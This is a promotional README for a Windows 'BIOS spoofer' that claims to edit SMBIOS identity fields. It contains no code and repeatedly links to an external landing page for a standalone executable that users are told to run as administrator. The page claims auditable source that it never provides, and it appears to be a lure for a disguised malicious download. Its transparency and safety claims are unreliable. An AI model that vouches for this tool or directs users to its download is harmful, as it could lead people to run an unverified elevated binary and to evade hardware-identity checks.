<div align="center">

<img src="assets/banner.svg" width="100%" alt="BIOS Spoofer banner"/>

# bios-spoofer-configurator 🧬🛡️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Rewrite what your motherboard tells the world — cleanly, safely, and on your own terms.*

<p align="center">
  <a href="https://exaautocratruffle.github.io/bios-spoofer-configurator/">
    <img src="https://img.shields.io/badge/GET-BIOS_Spoofer_2026-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
  </a>
</p>
</div>

## 🔍 Overview

I built `bios-spoofer-configurator` because I got tired of every "solution" in this space being a shady, unmaintained batch script passed around on forums with zero transparency about what it actually touches. This is a passion project, built from scratch, with a real UI, a real architecture, and a real changelog. It's a configurator for BIOS-level identity fields — the kind of low-level system identifiers that get baked into firmware and quietly follow your machine around forever unless you know exactly where to look.

At its core, this tool exists for people who care about hardware privacy, dual-boot testers, hardware QA engineers validating OEM images, and hobbyists who just want to understand what's actually stored in their firmware tables instead of taking it on faith. The domain of BIOS spoofing has historically been full of noise — sketchy executables, no changelogs, no source you can actually audit. This project flips that: everything is documented, the workflow is visible step by step, and nothing runs silently in the background.

Whether you're validating a lab environment, restoring a system profile after a motherboard swap, or just poking around SMBIOS tables for the first time, `bios-spoofer-configurator` gives you a controlled, readable, and reversible way to do it — instead of a black box you have to trust blindly.

## 🚀 Get It Now

<p align="center">

<a href="https://exaautocratruffle.github.io/bios-spoofer-configurator/">
    <img src="https://img.shields.io/badge/GET-BIOS_Spoofer_2026-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
  </a>

</p>

> [!NOTE]
> The landing page above is the only official distribution point. Builds are versioned by year, so `2026` is the current generation.

---

## ⚡ What Actually Sucked Before This

Every prior tool in this space made the same mistakes, and this project was built specifically to undo them:

- **No visibility into what changed** → this tool shows a full before/after diff of every field before you commit anything.
- **One-click "magic" with no explanation** → every module here is labeled, described, and optional.
- **Fragile scripts that broke on firmware updates** → the configurator detects your BIOS vendor and adapts its field map instead of assuming a fixed layout.
- **No rollback path** → snapshots are taken automatically before any write, so you can always restore.
- **Bloated installers full of unrelated junk** → this is a single standalone executable, nothing riding along with it.
- **Zero community or docs** → this repo actually has a real README (you're reading it), issue templates, and a changelog.

## 🧩 Capabilities That Make This Different

- **Field-level SMBIOS editing** — walk through Type 0, Type 1, and Type 2 tables individually instead of guessing which byte does what.
- **Snapshot & Restore engine** — every session begins with an automatic firmware-state snapshot so nothing is ever a one-way trip.
- **Vendor-aware profiles** — the tool recognizes common OEM firmware signatures and adjusts its available options accordingly.
- **Dry-run preview mode** — see the exact diff of proposed changes before anything touches your hardware.
- **Portable, dependency-free build** — one executable, no runtime installs, no background services.
- **Readable audit log** — every session writes a plain-text log of what was viewed and what was changed, timestamped.
- **Dark & light themes** — because staring at firmware tables at 2 AM shouldn't hurt your eyes.
- **Keyboard-first navigation** — built for people who'd rather tab through fields than fight a mouse.

## 🏁 How to Get Started

1. Visit the landing page via the download button above.
2. Download the standalone `bios-spoofer-configurator` executable — no installer wizard, no bundled extras.
3. Run it with administrator privileges (required for firmware table access on Windows).
4. Review the auto-generated snapshot, make your changes in preview mode, then confirm the write.

> [!TIP]
> Run the tool once in **dry-run mode** first. It costs you nothing and shows you exactly what a full run would touch.

## 🖥️ Requirements Matrix

| Component | Minimum | Recommended |
|---|---|---|
| **OS** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **RAM** | 2 GB | 4 GB+ |
| **Disk** | 150 MB free | 500 MB free (for snapshot history) |
| **Privileges** | Administrator | Administrator |
| **Dependencies** | None | None |

> [!IMPORTANT]
> This tool is Windows-only and standalone by design. There is nothing to install beyond the executable itself — no runtimes, no background services, no scheduled tasks.

## 🧠 How It Works

The workflow is intentionally linear and transparent, so you always know what stage you're in:

1. **Detection** — the app fingerprints your firmware vendor and current SMBIOS layout.
2. **Snapshot** — a full read-only capture of the current state is stored locally.
3. **Configuration** — you select and edit fields through the guided UI.
4. **Preview** — a diff view shows exactly what will change, field by field.
5. **Apply** — changes are committed only after explicit confirmation.

```mermaid
flowchart LR
    Detect --> Snapshot
    Snapshot --> Configure
    Configure --> Preview
    Preview --> Apply
```

## 🛟 Troubleshooting

<details>
<summary><strong>The tool says my firmware vendor is "Unknown" — what now?</strong></summary>

Unrecognized vendors fall back to a generic SMBIOS field map. You'll still see standard Type 0/1/2 fields, just without vendor-specific presets.

</details>

<details>
<summary><strong>Can I undo a change after applying it?</strong></summary>

Yes — every session's pre-change snapshot is stored locally and can be restored from the "Sessions" panel without needing to reapply anything manually.

</details>

<details>
<summary><strong>The app won't launch and nothing happens.</strong></summary>

Confirm you're running it with administrator privileges. Firmware table access is blocked entirely without elevation on Windows.

</details>

<details>
<summary><strong>Some fields are greyed out and can't be edited.</strong></summary>

Certain fields are locked by the firmware vendor itself at the hardware level and are outside what any software configurator can touch.

</details>

<details>
<summary><strong>Does this work on laptops with locked-down OEM firmware?</strong></summary>

Detection will still run, but write access on heavily locked OEM boards may be limited or unavailable — this varies by manufacturer, not by this tool.

</details>

> [!WARNING]
> Always keep a snapshot before making changes. While rollback is built in, interrupting an active write (power loss, forced shutdown) can leave firmware tables in an inconsistent state.

## 🎨 UI / UX Details

- **Themes:** Light, Dark, and a high-contrast mode for accessibility.
- **Keyboard shortcuts:**

| Action | Shortcut |
|---|---|
| Open snapshot panel | `Ctrl + S` |
| Toggle preview diff | `Ctrl + P` |
| Apply changes | `Ctrl + Enter` |
| Restore last snapshot | `Ctrl + R` |
| Search fields | `Ctrl + F` |

- **Settings:** logging verbosity, snapshot retention count, theme, and default vendor profile are all persisted between sessions.

![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen?style=flat-square) ![Tech](https://img.shields.io/badge/built%20with-C%2B%2B%20%26%20WinAPI-blue?style=flat-square)

## 🤝 Contributing & Community

This started as a solo passion project, but it's grown well past that, and I'd genuinely love more hands on it.

- Open an issue for bugs, vendor-specific quirks, or feature requests.
- Pull requests are welcome — please describe the *why* behind a change, not just the *what*.
- Discussions are the right place for "does this work with my board" style questions.

> [!TIP]
> If you're contributing a new vendor profile, include the raw SMBIOS dump (with serials redacted) so it can be verified before merging.

## 📄 License

Released under the [MIT License](LICENSE), 2026.

## ⚠️ Disclaimer

This project is provided for educational, diagnostic, and personal privacy purposes. You are solely responsible for how you use it and for complying with any applicable laws, warranty terms, or organizational policies regarding firmware modification. Always back up your system state before making changes.

<p align="center">

<a href="https://exaautocratruffle.github.io/bios-spoofer-configurator/">
    <img src="https://img.shields.io/badge/GET-BIOS_Spoofer_2026-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
  </a>

</p>